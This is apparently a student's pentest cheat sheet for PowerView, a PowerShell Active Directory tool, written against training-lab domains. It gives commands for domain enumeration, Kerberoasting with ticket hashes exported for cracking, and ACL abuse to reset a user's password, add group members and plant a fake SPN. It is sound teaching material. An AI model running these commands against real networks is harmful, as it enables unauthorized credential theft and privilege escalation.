-- -
Powershell module, so need a windows host to run it from. This is the depricated software, i.e. is not currently maintained by anyone. See [[SharpView]] for one of its maintained projects. 
#### Useful Functions
###### General
|                       |                                                                                   |
| --------------------- | --------------------------------------------------------------------------------- |
| `Export-PowerViewCSV` | Append results to a CSV file                                                      |
| `ConvertTo-SID`       | Convert a User or group name to its SID value                                     |
| `Get-DomainSPNTicket` | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |
###### Domain/LDAP
|                             |                                                                                      |
| --------------------------- | ------------------------------------------------------------------------------------ |
| `Get-Domain`                | Will return the AD object for the current (or specified) domain                      |
| `Get-DomainController`      | Return a list of the Domain Controllers for the specified domain                     |
| `Get-DomainUser`            | Will return all users or specific user objects in AD                                 |
| `Get-DomainComputer`        | Will return all computers or specific computer objects in AD                         |
| `Get-DomainGroup`           | Will return all groups or specific group objects in AD                               |
| `Get-DomainOU`              | Search for all or specific OU objects in AD                                          |
| `Find-InterestingDomainAcl` | Finds object ACLs in the domain with modification rights set to non-built in objects |
| `Get-DomainGroupMember`     | Will return the members of a specific domain group                                   |
| `Get-DomainFileServer`      | Returns a list of servers likely functioning as file servers                         |
| `Get-DomainDFSShare`        | Returns a list of all distributed file systems for the current (or specified) domain |
###### GPO
|   |   |
|---|---|
|`Get-DomainGPO`|Will return all GPOs or specific GPO objects in AD|
|`Get-DomainPolicy`|Returns the default domain policy or the domain controller policy for the current domain|
###### Computer Enumeration
|                           |                                                                                        |
| ------------------------- | -------------------------------------------------------------------------------------- |
| `Get-NetLocalGroup`       | Enumerates local groups on the local or a remote machine                               |
| `Get-NetLocalGroupMember` | Enumerates members of a specific local group                                           |
| `Get-NetShare`            | Returns open shares on the local (or a remote) machine                                 |
| `Get-NetSession`          | Will return session information for the local (or a remote) machine                    |
| `Test-AdminAccess`        | Tests if the current user has administrative access to the local (or a remote) machine |
###### Threaded "meta" functions
|                                   |                                                                                         |
| --------------------------------- | --------------------------------------------------------------------------------------- |
| `Find-DomainUserLocation`         | Finds machines where specific users are logged in                                       |
| `Find-DomainShare`                | Finds reachable shares on domain machines                                               |
| `Find-InterestingDomainShareFile` | Searches for files matching specific criteria on readable shares in the domain          |
| `Find-LocalAdminAccess`           | Find machines on the local domain where the current user has local administrator access |
###### Domain Trust
|                                |                                                                                            |
| ------------------------------ | ------------------------------------------------------------------------------------------ |
| `Get-DomainTrust`              | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`              | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`        | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember` | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`       | Will enumerate all trusts for the current domain and any others seen.                      |
#### Basic Usage
```powershell
# import module to use it
import-module .\PowerView.ps1

# Get Password Policy
Get-DomainPolicy
```

^b29806
#### Get User Information
```powershell
# Retreive specified information about specified user
Get-DomainUser -Identity <username> -Domain <domain> | Select-Object -Property <field names> 

Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

^110738

^118201
#### Recursive Group Membership
```powershell
# Doing this recursively means it will spit out the group members of nested groups, so if a group is found that's a child of Domain Admins, it lists out the users that inheret Domain Admin privs
Get-DomainGroupMember -Identity "<domain group>" -Recurse
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

^5e6a2b

#### Trust Enumeration
```powershell
GetDomainTrustMapping
```

^fb9583

#### Test Admin Access
```powershell
# test if your account is local admin in current machine or a remote one
Test-AdminAccess -ComputerName <hostname> 
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

^a626c8

#### Find Users w/ SPN Set
```powershell
Get-DOmainUser -SPN -Properties samaccountname,ServicePrincipalName
```

#### Kerberoasting
```powershell
# Import module
Import-Module .\PowerView.ps1

# Get Available SPNs
Get-DomainUser * -spn | select samaccountname

# Get TGS for specific SPN, formatted for hashcat cracking
Get-DomainUser -Identity sqldev| Get-DomainSPNTicket -Format Hashcat

# Get TGS for all SPNs and output to csv
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\inlfreight_tgs.csv -NoTypeInformation

# Then crack using Hashcat
```

^2c6ed0

#### ACLs
###### Enum ACLs
```powershell
# Get all ACLs in domain. Not super helpful as it will be a massive output requiring the laborous and time consuming process of manually going through it and is likely inaccurate.
Find-InterestingDomainAcl

# Targetted ACL enum for specific user
# first, get the user's suid
$sid = Convert-NameToSid <user>
$sid = Convert-NameToSid wley

# Enum ACLs for that user, note that the key piece is the SecurityIdentifier attribute, and that it will be a GUID so you will need to google search what the GUID means or use powershell (below).
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Get meaning of ACL GUID
# In this example, the guid "00299570-246d-11d0-a768-00aa006e0529" was identified in the previous command under the SecurityIdentifier field.
$guid = "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

# or just make your life easy and use the -ResoveGUIDs flag
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

^6a3f67

#### (ACL Abuse) Create and use Secure Strings
```powershell
# Some commands require a validly configured Secure String Object, so to interact with AD as that user, you need to create an object correctly:
# Create Secure String
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

# Create Credentials Object
$Cred = New-Object System.Managemnet.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Create second secure string.
$damundsenPassword = ConverTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# use cred obj and secure string to change damunsen's password
# Make sure to import Powerview
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

^507f05

#### (ACL Abuse) Add user to a tasty group
```powershell
# Make credential object to authenticate to AD commands
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>/<user>', $SecPassword)

# Enum current group memebership of target group 
Get-AdGroup -Identity "<group name>" -Properties * | Select -ExpandProperty Members

# Add user to group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members '<user>' -Crednetial $Cred -Verbose

# Verify user was added
Get-DomainGroupMemeber -Identity "<group name>" | Select MemberName
```

^ffb6bc

#### Create Fake SPN
```powershell
# Remember $Cred is a credential object
Set-DomainObject -Credential $Cred -Identity <user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

^ec631e

#### Enumerate Remote Desktop Users Group
```powershell
Get-NetLocalGroupMember -ComputerName <hostname> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

^75452d

#### Enumerate Remote Management Users Group
```powershell
Get-NetLocalGroupMemeber -computerName <hostname> -GroupName "Remote Management Users"
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

^7a386e

#### Find passwords in description field of user account
```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

^ebee80

#### Check if password is required on account
```powershell
# If this field is set for an account, it means the password length set by the password policy can be ignored by this account and the password may not even be set.
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

^ecd495

#### Enumerate DONT_REQ_PREAUTH value
[[ASREPRoasting]]
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

^196ccc
